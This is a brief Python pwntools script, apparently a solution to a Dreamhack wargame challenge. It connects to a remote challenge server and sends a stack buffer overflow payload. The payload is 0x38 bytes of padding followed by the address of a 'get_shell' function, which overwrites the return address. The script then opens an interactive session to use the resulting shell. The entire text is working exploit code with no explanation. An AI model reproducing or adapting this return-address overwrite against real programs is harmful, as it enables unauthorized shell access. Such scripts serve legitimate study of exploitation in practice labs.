from pwn import *

# get_shell_addr = 0x4006aa 

offset = 0x38

r = remote("host3.dreamhack.games", 9600)

payload = b'A' * 0x30
payload += b'A' * 0x8
payload += b"\xaa\x06\x40\x00\x00\x00\x00\x00"

r.sendafter("Input: ", payload)

r.interactive()